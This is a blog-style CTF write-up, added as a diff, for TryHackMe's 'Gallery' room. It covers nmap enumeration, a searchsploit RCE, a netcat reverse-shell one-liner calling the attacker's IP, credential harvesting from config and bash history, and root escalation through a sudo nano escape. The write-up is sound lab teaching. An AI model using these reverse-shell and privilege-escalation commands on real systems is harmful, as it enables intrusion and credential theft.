@@ -1,0 +1,94 @@
+---
+title: "Gallery TryHackMe"
+date: "02-15-2022"
+author: "Reda BELHAJ"
+summary: "The gallery is not very well secured. Designed and created by @Mikaa !"
+tags: ["TryHackMe", "Ctf", "Writeup"]
+image: "/images/Gallery/bg.png"
+---
+Let’s take a look at the [Gallery CTF](https://tryhackme.com/room/gallery666) on TryHackMe Created by **@Mikaa**.
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.22.177 -sC -sS
+```
+The “Nmap Output” displayed `2` service running under port 80 and 8080.
+![Nmap](/images/Gallery/nmap.jpg)
+
+And I've decided to search the http-title of the web application running in 8080: **Simple Image Gallery** and it come out as a *Content management system*.
+
+## Exploiting
+Now let’s look for exploits that we can use.
+
+```
+searchsploit Simple Image Gallery
+```
+![SearchSploit](/images/Gallery/searchsploit.jpg)
+The Output displayed that there's a **RCE**: Remote Code Execution and a **SQLi**: SQL Injection. And I've decide to go with the RCE vulnerability:
+![Exploit](/images/Gallery/exploit.jpg)
+
+So it successfully did a RCE and uploaded a shell on the host. As we open the link that we got, we did see a result of the RCE and I tried **ls** command on it:
+![LsAll](/images/Gallery/lsall.jpg)
+
+### Reverse Shell
+I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
+```
+
+**Great!** I received a reverse connection on my port 4444. And I've upgraded the shell with pty module: 
+![shellOpen](/images/Gallery/shellOpen.jpg)
+
+
+## Admin’s Password Hash
+Now we're in the machine and I decided to take a look at the `initialize.php` file which gave me the username and the password for accessing the database:
+![initial](/images/Gallery/initial.jpg)
+
+Then I tried to connect to the database using the credentials of last file. And I found the **Admin’s Password Hash**:
+![insideDB](/images/Gallery/insideDB.jpg)
+
+## User Flag
+Inside the home directory of the mike user. I notice a file called `user.txt` but I didn't have the rights to access it. 
+![premDenied](/images/Gallery/premDenied.jpg)
+
+As I was exploring I found a directory named `backups` and in it there was a folder with the name `mike_home_backup`. And inside it I looked for the *bash_history* file:
+![bashHistory](/images/Gallery/bashHistory.jpg)
+
+**Boom** we found mike's password.
+
+```
+su mike
+```
+
+Then I found the user.txt file:
+
+```
+THM******************
+```
+
+## Root Flag
+Now it’s time to escalate our privileges and get the root flag. 
+![sudoL](/images/Gallery/sudoL.jpg)
+
+So as a result of `sudo -l` we found that there's a file called `/opt/rootkit.sh` which mike was allowed to run as sudo. And it ask for the user input and with the use of the switch cases it delivers:
+
+Lastely I searched for nano on [GTFObins](https://gtfobins.github.io/) and I found this:
+
+```
+sudo /bin/bash /opt/rootkit.sh
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+Running the file using sudo, entering the read command to open nano and following the steps of GTFObins helps me escalate to root:
+![privEscDone](/images/Gallery/privEscDone.jpg)
+
+Then I found the root.txt file:
+
+```
+THM******************
+```
